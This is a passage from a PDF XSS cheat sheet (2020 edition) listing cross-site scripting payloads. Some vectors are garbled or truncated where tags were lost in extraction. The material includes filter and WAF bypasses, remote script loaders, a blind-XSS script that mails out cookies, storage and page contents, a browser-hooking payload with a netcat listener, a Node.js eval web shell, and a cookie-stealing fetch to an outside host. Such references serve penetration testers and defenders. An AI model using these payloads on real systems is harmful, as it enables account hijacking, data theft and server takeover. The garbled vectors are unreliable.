hover this!
hover this!
click this!
paste here!
hover this!
hover this!
hover this!
hover this!
hover this!
hover this!
hover this!
hover this!
hover this!
Mixed Context Reflection Entity Bypass
Use to turn a filtered reflection in script block in actual valid js code. It requires to be
reflected both in HTML and javascript contexts, in that order, and close to each other. The
svg tag will make the next script block be parsed in a way that even if single quotes become
encoded as &#39; or &apos; in reflection (sanitized), it will be valid for breaking out of
current value and trigger the alert. Vectors for the following javascript scenarios,
respectively: single quote sanitized, single quote fully escaped, double quote sanitized and
double quote fully escaped.
">'-alert(1)-'
">&#39-alert(1)-&#39
">alert(1)-"
"&#34>alert(1)-&#34
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 17
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Strip-My-Script Vector
Use to trick filters that strips the classic and most known XSS vector. It works as it is and if
“” gets stripped.
Javascript Alternative Comments
Use when regular javascript comments (//) are not allowed, escaped or removed.
JS Lowercased Input
Use when target application turns your input into lowercase via javascript. It might work
also for server-side lowercase operations.
Overlong UTF-8
Use when target application performs best-fit mapping.
%CA%BA>%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)>
Vectors Exclusive for ASP Pages
Use to bypass 
%u3008svg onload=alert(2)>
%uFF1Csvg onload=alert(3)>
PHP Email Validation Bypass
Use to bypass FILTER_VALIDATE_EMAIL flag of PHP’s filter_var() function.
">"@x.y
PHP URL Validation Bypass
Use to bypass FILTER_VALIDATE_EMAIL flag of PHP’s filter_var() function.
javascript://%250Aalert(1)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 18
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
PHP URL Validation Bypass – Query Required
Use to bypass FILTER_VALIDATE_EMAIL with FILTER_FLAG_QUERY_REQUIRED of PHP’s
filter_var() function.
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
(with domain filter)
javascript://https://DOMAIN/%250A1?alert(1):0
DOM Insertion via Server Side Reflection
Use when input is reflected into source and it can't execute by reflecting but by being
inserted into DOM. Avoids browser filtering and WAFs.
\74svg o\156load\75alert\501\51\76
XML-Based Vector for Bypass
Use to bypass browser filtering and WAFs in XML pages. Prepend a “-->” to payload if input
lands in a comment section or “]]>” if input lands in a CDATA section.
alert(1)
Javascript Context - Code Injection (IE11/Edge Bypass)
Use to bypass Microsoft IE11 or Edge when injecting into javascript context.
';onerror=alert;throw 1//
HTML Context - Tag Injection (IE11/Edge XSS Bypass)
Use to bypass their native filter in multi reflection scenarios.
"'>confirm&lpar;1){{$new.constructor(a)()}}
Inside Comments Bypass
Vector to use if anything inside HTML comments are allowed (regex: //).
Agnostic Event Handlers Vectors – Native Script Based
Vectors with event handlers that can be used with arbitrary tag names useful to bypass
blacklists. They require some script loaded in page after the point of injection in source
code. Keep in mind that using existing tag names like “
Agnostic Event Handlers Vectors – CSS3 Based
Vectors with event handlers that can be used with arbitrary tag names useful to bypass
blacklists. They require CSS in the form of  or importing stylesheet with . Last
four ones work only in Firefox.
x{animation:s}@keyframes s{}
x{animation:s}@keyframes s{}
x{animation:s}@keyframes s{}
x{animation:s}@keyframes s{}
*{transition:color 1s}*:hover{color:red}
*{transition:color 1s}*:hover{color:red}
*{transition:color 1s}*:hover{color:red}
*{transition:color 1s}*:hover{color:red}
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 20
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Remote Script Call
Use when you need to call an external script but XSS vector is an handler-based one (like
” is being filtered somehow, replace “r=>” or “w=>” for
“function()”.
=> HTML-based
(response must be HTML with an Access-Control-Allow-Origin (CORS) header)
"var x=new XMLHttpRequest();x.open('GET','//brutelogic.com.br/0.php');x.send();
x.onreadystatechange=function(){if(this.readyState==4){write(x.responseText)}}"
fetch('//brutelogic.com.br/0.php').then(r=>{r.text().then(w=>{write(w)})})
(with fully loaded JQuery library)
$.get('//brutelogic.com.br/0.php',r=>{write(r)})
=> Javascript-based
(response must be javascript)
with(document)body.appendChild(createElement('script')).src='//brutelogic.com.br/2.js'
(with fully loaded JQuery library)
$.getScript('//brutelogic.com.br/2.js')
(CORS and js extension required)
import('//domain/file')
Invisible Foreign XSS Embedding
Use to load a XSS from another domain (or subdomain) into the current one. Restricted by
target’s X-Frame-Options (XFO) header. Example below alerts in brutelogic.com.br context
regardless of domain.
"
style=display:none>
Simple Virtual Defacement
Use to change how site will appear to victim providing HTML code. In the example below a
“Not Found” message is displayed.
documentElement.innerHTML='Not Found'
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 21
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Blind XSS Mailer
Use it as a blind XSS remote script saving as PHP file and changing $to and $headers vars
accordingly. A working mail server like Postfix is required.
var mailer = '';
var msg = 'USER AGENT\n' + navigator.userAgent + '\n\nTARGET URL\n' + document.URL;
msg += '\n\nREFERRER URL\n' + document.referrer + '\n\nREADABLE COOKIES\n' +
document.cookie;
msg += '\n\nSESSION STORAGE\n' + JSON.stringify(sessionStorage) + '\n\nLOCAL
STORAGE\n' + JSON.stringify(localStorage);
msg += '\n\nFULL DOCUMENT\n' + document.documentElement.innerHTML;
var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));
Browser Remote Control
Use to hook browser and send javascript commands to it interactively. Use the javascript
code below instead of alert(1) in your injection with an Unix-like terminal open with the
following shell script (listener). Provide a HOST as a hostname, IP address or domain to
receive commands from attacker machine.
=> Javascript (payload):
setInterval(function(){with(document)body.
appendChild(createElement('script')).src='//HOST:5855'},100)
=> Listener (terminal command):
$ while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 22
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Node.js Web Shell
Use to create a web shell in vulnerable Node.js applications. After running payload below
use shell in the following way: http://target:5855/?cmd=my_node.js_command
Example to pop calc: cmd=require('child_process').exec('gnome-calculator').
require('http').createServer(function(req,res){res.end(1-
eval(require('url').parse(req.url,1).query.cmd))}).listen(5855)
Cookie Stealing
Use to get all cookies from victim user set by target site. It can’t get cookies protected by
httpOnly security flag. Encode “+” as “%2B” in URLs.
fetch('//brutelogic.com.br/?c='+document.cookie)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 23
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
XSS Online Test Page
Use to practice XSS vectors and payloads. Check source code for injection points.
https://brutelogic.com.br/xss.php
HTML Entities Table
Use to HTML encode chars.
https://brutelogic.com.br/utils/charref.htm
Multi-Case HTML Injection
Use as one-shot to have higher successful XSS rates. It works in all cases of the HTML
context (see Basics section), including the JS one with tag injection. Notice the spaces as
failover for simple sanitizing/escaping performed by app.
Multi-Case HTML Injection - Base64
Use as one-shot to have higher successful XSS rates in Base64 input fields. It works in all
cases of the HTML context (see Basics section), including the JS one with tag injection.
PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC
A8IS0tPg==
Vectors for Fixed Input Length
Use when input must have a fixed length like in most common following hashes.
MD5 12345678901
SHA1 1234567890123456789
SHA256 1234567890123456789012345678901234567890123
PHP Sanitizing for XSS